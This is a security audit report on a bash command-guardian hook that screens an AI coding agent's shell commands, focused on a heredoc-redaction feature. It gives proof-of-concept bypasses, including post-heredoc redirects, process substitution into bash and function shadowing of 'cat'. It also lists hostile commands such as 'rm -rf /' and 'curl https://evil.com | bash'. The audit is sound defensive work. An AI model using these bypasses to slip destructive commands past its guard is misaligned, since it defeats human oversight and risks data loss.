# Phase 1 Heredoc Redaction -- Adversarial Security Audit

**Date**: 2026-03-21
**Auditor**: Claude Opus 4.6 (security audit mode)
**Scope**: Phase 1 implementation in `bash_guardian.py` (data structures lines 77-215, `split_commands` 255-635, `_consume_heredoc_bodies` 688-781, `main` 1697-1722)
**Test coverage reviewed**: `tests/regression/test_heredoc_redaction.py` (69 tests)

---

## Executive Summary

Phase 1 introduces a well-designed heredoc body redaction system with strong fail-closed defaults. The 5-rule classifier and origin-tracking design are fundamentally sound. However, one **HIGH severity** vulnerability was found: **output redirections placed after the `<<` operator are invisible to the classifier**, allowing an attacker to write heredoc body content to arbitrary files while having the body incorrectly redacted from Layer 0/0b scanning.

**Finding count**: 1 HIGH, 2 MEDIUM, 2 LOW, 3 INFO

---

## A. Classification Bypass Attacks

### A1. CRITICAL-DOWNGRADED-TO-HIGH: Redirect After `<<` Operator (Post-Heredoc Redirect Blindness)

**Severity**: HIGH
**Status**: Confirmed vulnerability, not tested

**Attack vector**: In bash, output redirections can appear anywhere in a simple command. The forms `cat > file << EOF` and `cat << EOF > file` are semantically identical -- both write the heredoc body to `file`. However, the origin command is captured at `<<` parse time (line 558-559), so only text *before* `<<` is included in the origin.

**Affected redirect operators**: `>`, `>>`, `&>`, `>&file` (all forms except `>|` which is accidentally caught because `|` triggers pipe splitting)

**Proof of concept**:
```
# All of these incorrectly redact the body:
cat << EOF > /tmp/evil.sh       # origin="cat" -> SAFE (WRONG)
cat << EOF >> /tmp/evil.sh      # origin="cat" -> SAFE (WRONG)
cat << EOF &> /tmp/evil.sh      # origin="cat" -> SAFE (WRONG)
cat << EOF > >(bash)            # origin="cat" -> SAFE (WRONG)

# This correctly retains the body:
cat > /tmp/evil.sh << EOF       # origin="cat > /tmp/evil.sh" -> redirect detected -> UNSAFE
```

**Impact analysis**: When the body is incorrectly redacted, Layer 0/0b pattern matching loses visibility. Tested against all default block/ask patterns:
- **9 block patterns** would match body content that is now redacted (rm -rf /, rm -rf .git, git push --force, git filter-branch, curl|bash, shred, find -delete, interpreter deletion, eval deletion)
- **6 ask patterns** would match body content that is now redacted (rm -rf, git reset --hard, git clean, DROP TABLE, TRUNCATE TABLE, DELETE FROM)

**Mitigating factors**:
- The redirect *target* (e.g., `/tmp/evil.sh`, `.env`) IS visible in the sub-command text and IS scanned by Layer 1 (protected path scan) and Layer 3 (path extraction from redirections). So writing to protected paths like `.env` IS still caught.
- The body content being written is data, not directly executed commands. The danger is in creating executable scripts.
- Pre-Phase-1, Layer 1 also did not scan heredoc body content (bodies were consumed by `split_commands`). Phase 1 only regresses Layer 0/0b visibility.

**Recommended fix**: After the `<<` operator and delimiter are parsed, scan the *full sub-command text* (not just the origin) for output redirections. Alternatively, apply Rule 2 (redirect check) using the complete sub-command at classification time by passing the full sub-command alongside the origin:

```python
# In _consume_heredoc_bodies, after delimiter match:
# Instead of only checking origin_cmd for redirects,
# also check the full sub-command that was split.
```

Or more simply: change origin capture to use the full sub-command text at body-consumption time rather than the partial text at `<<` parse time.

---

### A2. LOW: Absolute Path / Symlink / PATH Manipulation

**Severity**: LOW (accepted trust boundary)

**Attack**: `/home/user/cat` (actually a malicious script named `cat`), or a symlink `cat -> bash`, or `PATH=/evil:$PATH cat << EOF`.

**Analysis**: `_extract_base_command()` uses `Path(part).name` to extract the basename from absolute paths. So `/home/user/cat` extracts to `cat`, which is in `_PASSIVE_DATA_SINKS` -> classified as SAFE.

**Assessment**: This is an accepted trust boundary. If an attacker can plant binaries with passive-sink names in PATH or create symlinks, they have already compromised the execution environment. The guardian operates at the *command string* level, not the *binary resolution* level. The test suite covers `/usr/bin/cat` extraction correctly.

**No fix recommended** -- document as accepted limitation.

---

### A3. INFO: Process Substitution as Redirect Target

**Severity**: HIGH (subsumed by A1)

**Attack**: `cat << EOF > >(bash)` -- uses process substitution to pipe heredoc body to an interpreter.

**Analysis**: This is a specific instance of A1. The `> >(bash)` appears after `<<`, so the origin is just `cat`. The process substitution is NOT caught by `_OUTPUT_REDIR_PATTERN` because the pattern expects `>[non-operator]` but `>(` is how process substitution starts.

**Note**: Even if origin capture included post-`<<` text, `_OUTPUT_REDIR_PATTERN` would need updating to catch `> >(...)` as a redirect. Currently it would match `>(` as a redirect target, which happens to be correct behavior (any `>` followed by a non-operator character triggers UNSAFE).

**Fix**: Subsumed by A1 fix. Once the full sub-command is scanned for redirects, `> >(bash)` would be caught by the existing `_OUTPUT_REDIR_PATTERN`.

---

### A4. INFO: `>|` (Clobber) Accidentally Caught

**Severity**: INFO (positive finding)

**Attack**: `cat << EOF >| file`

**Analysis**: The `|` in `>|` triggers the pipe separator logic (line 506), which marks the heredoc as piped (Rule 3 -> UNSAFE). This is *accidentally correct* -- the pipe handler catches a non-pipe operator. The sub-command gets split at `|`, producing `['cat << EOF >', 'file']`.

**Assessment**: While the result is safe (body retained), the parsing is incorrect. The `>|` operator should be treated as a single redirect operator, not as `>` followed by pipe `|`. This could cause subtle issues in other contexts.

**Low priority fix**: Add `>|` handling before the pipe separator check.

---

## B. Parsing Differential Attacks

### B1. INFO: Synthetic Pattern Matching

**Severity**: INFO (no issue found)

**Analysis**: Redacted bodies are replaced with empty lines (newlines only). Could empty lines + delimiter line + next command create synthetic pattern matches?

**Testing showed**: Real block/ask patterns use `[^;|&\n]*` or `\s+` which prevent cross-line matching. The `re.DOTALL` flag makes `.` match `\n`, but no default pattern uses `.*` in a way that would create synthetic matches across the redacted gap. Newline count preservation prevents token merging.

**Assessment**: No vulnerability found. The newline-preservation design is sound.

---

### B2. MEDIUM: `$` Anchor Behavior Difference (DOTALL vs MULTILINE)

**Severity**: MEDIUM (pre-existing, not introduced by Phase 1)

**Analysis**: Block/ask patterns use `re.IGNORECASE | re.DOTALL` but NOT `re.MULTILINE`. With DOTALL alone, `$` matches only end-of-string, not end-of-line. This means patterns like `rm\s+-[rRf]+\s+/(?:\s*$|\*)` only match `rm -rf /` when it appears at the very end of the command string.

When `rm -rf /` appears on a line within a heredoc body (or any multi-line command), the `\s*$` alternative does not match because there is more text after it. Only the `\*` alternative could match (if there's a `*`).

**Impact on Phase 1**: This is NOT a Phase 1 regression. The same patterns failed to match heredoc body content pre-Phase-1 in many cases. However, Phase 1 *does* remove the cases where patterns *did* match (e.g., `git push --force` which uses `[^;|&\n]*` instead of `$`).

**Pre-existing gap**: Patterns relying on `$` for end-of-line matching have always been limited in multi-line commands.

---

## C. Origin Tracking Attacks

### C1. Verified Correct: Multiple `<<` with Different Origins

**Attack**: `bash << E1 ; cat << E2` -- does the second heredoc get `bash` as origin?

**Analysis**: Origin is captured at each `<<` parse time. For `bash << E1`, origin = `bash`. Then `;` splits the command, resetting `current`. For `cat << E2`, origin = `cat`. The origins list correctly maintains parallel entries.

**Test coverage**: `TestF11OriginTracking.test_multiple_heredocs_different_origins` (line 245)

**Result**: CORRECT. First body (bash origin) retained, second body (cat origin) redacted.

---

### C2. Verified Correct: Pipe Flag Propagation

**Attack**: `cat << EOF | bash` -- does the pipe flag override safe origin?

**Analysis**: When `|` is encountered (line 508-512), ALL pending heredoc origins are marked as piped (`was_piped=True`). Rule 3 checks `was_piped` first. So even though origin is `cat` (SAFE by Rule 4), the pipe flag forces UNSAFE.

**Test coverage**: `TestF11OriginTracking.test_pipe_overrides_safe_origin` (line 239)

**Result**: CORRECT. Body retained despite safe origin.

---

### C3. Verified Correct: `$(bash) << EOF`

**Attack**: Nested command substitution in command position.

**Analysis**: `$( ` triggers depth tracking. Inside `$()`, `depth > 0`, so `<<` is not detected as a heredoc operator. The entire expression stays as one sub-command, body content remains visible.

**Result**: CORRECT. No redaction occurs.

---

## D. Fail-Open Path Analysis

### D1. Verified Fail-Closed: `_classify_heredoc_safety()` Exception

**Severity**: INFO (no issue)

**Analysis**: If `_classify_heredoc_safety()` receives `None` or non-string input, it throws `AttributeError` at `.strip()`. This exception propagates up through `_consume_heredoc_bodies()` to `split_commands()`, which does NOT have a try/except around the main parsing loop. The exception reaches `main()`, which crashes the script. The hook framework catches crashes and returns deny (fail-closed).

**Assessment**: Effectively fail-closed via the hook error handler.

---

### D2. Verified Fail-Closed: `_extract_base_command()` Edge Cases

**Severity**: INFO (no issue)

**Analysis**:
- Unclosed quotes -> `shlex.split` raises `ValueError` -> caught, returns `''` -> Rule 5 -> UNSAFE
- Null bytes -> `shlex.split` handles them, returns token -> `Path().name` extracts basename
- `strace -f cat` -> `-f` returned as command -> not in sinks -> Rule 5 -> UNSAFE (overly conservative but safe)
- `sudo -u root -H cat` -> sudo flag-skipping bug consumes `cat` as flag argument -> returns `''` -> Rule 5 -> UNSAFE

**Assessment**: All edge cases fail closed. The `sudo` multi-flag parsing has a minor correctness bug (skips too many tokens) but the result is always fail-closed.

---

### D3. Verified Fail-Closed: Unterminated Heredocs

**Analysis**: When `_consume_heredoc_bodies()` exhausts input without finding delimiter, the `else` clause of the `while` loop (line 771) marks the body as UNSAFE. Body content is retained in the redacted string.

**Test coverage**: `TestUnsafeHeredocRetention.test_unterminated_heredoc_body_retained` (line 208)

**Assessment**: CORRECT. Fail-closed.

---

### D4. Verified Fail-Closed: Redaction Builder Exception

**Analysis**: The redaction builder (lines 611-633) is wrapped in `try/except Exception` that falls back to the original command string. Original command = more content = more pattern checks = fail-closed.

**Assessment**: CORRECT. Fail-closed.

---

## E. Regression Attacks

### E1. MEDIUM: Function Override Hiding Dangerous Body Content

**Severity**: MEDIUM

**Attack**: `cat() { bash "$@"; } ; cat << EOF\nrm -rf /\nEOF`

**Analysis**: The classifier sees origin = `cat` (the second `cat` after `;`). It classifies as SAFE because `cat` is in `_PASSIVE_DATA_SINKS`. The body is redacted. But at runtime, `cat` has been overridden to execute `bash`.

**Mitigating factors**:
- The function definition `cat() { bash "$@"; }` IS visible as a separate sub-command to all layers
- Layer 0 patterns don't specifically detect function redefinitions of passive sink names
- This attack requires the attacker to control both the function definition AND the heredoc in the same command string, which is an unusual pattern for Claude Code
- Pre-Phase-1, the block patterns also did NOT catch `rm -rf /` inside the heredoc body of this specific command (the `rm\s+-[rRf]+\s+/(?:\s*$|\*)` pattern doesn't match because `$` needs end-of-string in DOTALL mode)

**Assessment**: Theoretical concern. The function override itself is visible to all layers. The body content was also not reliably caught pre-Phase-1 due to the `$` anchor behavior (B2). However, `git push --force` and other patterns that use `[^;|&\n]*` instead of `$` WOULD have been caught pre-Phase-1 and are now missed.

**Recommended mitigation**: Consider adding a block/ask pattern for function definitions that shadow passive data sink names (e.g., `cat\s*\(\s*\)`). This is defense-in-depth.

---

### E2. Verified No Regression: Non-Heredoc Dangerous Commands

**Analysis**: Tested the following in redacted commands:
- `rm -rf /` (no heredoc) -> visible in redacted string
- `curl https://evil.com | bash` (no heredoc) -> visible in redacted string
- `git push --force origin main` (no heredoc) -> visible in redacted string
- `python3 -c "os.remove('.env')"` (no heredoc) -> visible in redacted string
- Dangerous command after safe heredoc -> visible in redacted string
- Dangerous command before safe heredoc -> visible in redacted string

**Result**: NO REGRESSION. All non-heredoc dangerous commands remain fully visible.

---

### E3. Verified No Regression: Unsafe Heredoc Bodies

**Analysis**: Tested interpreter commands (bash, python3, sh, eval, node), piped heredocs, redirect-before-<< heredocs, unknown commands, tee, sort. All correctly retain body content in the redacted string.

**Test coverage**: `TestUnsafeHeredocRetention` class (11 tests)

**Result**: NO REGRESSION for correctly-classified unsafe heredocs.

---

## Findings Summary

| ID | Severity | Title | Fix Required? |
|----|----------|-------|--------------|
| A1 | HIGH | Redirect after `<<` invisible to classifier | YES |
| A2 | LOW | Absolute path / symlink / PATH manipulation | No (accepted boundary) |
| A3 | INFO | Process substitution as redirect (subsumed by A1) | By A1 fix |
| A4 | INFO | `>|` accidentally caught by pipe handler | Low priority |
| B1 | INFO | Synthetic pattern matching -- no issue found | N/A |
| B2 | MEDIUM | `$` anchor with DOTALL (pre-existing) | Separate issue |
| E1 | MEDIUM | Function override hiding body content | Defense-in-depth |

---

## Recommended Fixes (Priority Order)

### P0: Fix A1 -- Post-Heredoc Redirect Detection

**Option A (Minimal)**: After body consumption, check the full sub-command (not just origin) for output redirections before classifying. Pass the complete sub-command text to `_classify_heredoc_safety()`:

```python
# In _consume_heredoc_bodies, at classification (line 764-768):
# Instead of classifying with just origin_cmd:
#   is_safe = _classify_heredoc_safety(origin_cmd, was_piped)
# Classify with the full sub-command that was collected:
#   full_cmd = origin_cmd + " << " + delim + rest_of_line
#   is_safe = _classify_heredoc_safety(full_cmd, was_piped)
```

**Option B (Robust)**: At the point where heredoc bodies are consumed (newline handler, line 586), reconstruct the full sub-command from `sub_commands[-1]` (the last split sub-command which contains the `<< DELIM ...` text) and use it for redirect detection in Rule 2.

**Option C (Simplest)**: Change origin capture to happen at body-consumption time instead of `<<` parse time. Use the most recent sub-command in `sub_commands` list as origin. This naturally includes any redirects that appeared after `<<`.

### P1: Defense-in-depth for E1

Add a block or ask pattern that detects function definitions shadowing passive data sink names:
```json
{"pattern": "(?:cat|grep|head|tail|wc|echo|printf)\\s*\\(\\s*\\)", "reason": "Function shadows passive data sink name"}
```

### P2: Fix B2 (Pre-existing, separate from Phase 1)

Consider adding `re.MULTILINE` to pattern matching flags, or adjust patterns that use `$` to use `(?:$|\n)` instead. This is a pre-existing issue that affects all multi-line command scanning.

---

## Test Coverage Assessment

The existing 69 tests in `test_heredoc_redaction.py` provide good coverage for:
- Safe/unsafe classification rules
- Origin tracking across separators
- Backward compatibility
- Critical regression checks
- Edge cases (process substitution, quoted delimiters, clobber)

**Missing test coverage**:
1. **Redirect AFTER `<<`**: No test for `cat << EOF > file` vs `cat > file << EOF`. The existing `test_redirect_makes_heredoc_unsafe` (line 166) only tests redirect BEFORE `<<`.
2. **Process substitution redirect**: No test for `cat << EOF > >(bash)`.
3. **`&>` after `<<`**: No test for `cat << EOF &> file`.
4. **`>>` after `<<`**: The test `test_append_redirect_makes_heredoc_unsafe` (line 173) tests `cat >> file.sh << EOF` (redirect before), not the after case.
5. **Function override**: No test for `cat() { bash; } ; cat << EOF`.
6. **`sudo` multi-flag parsing**: No test for `sudo -u root -H cat`.
7. **Empty delimiter edge case**: No test for `cat << \n...\n\n` (empty delimiter matching empty line).
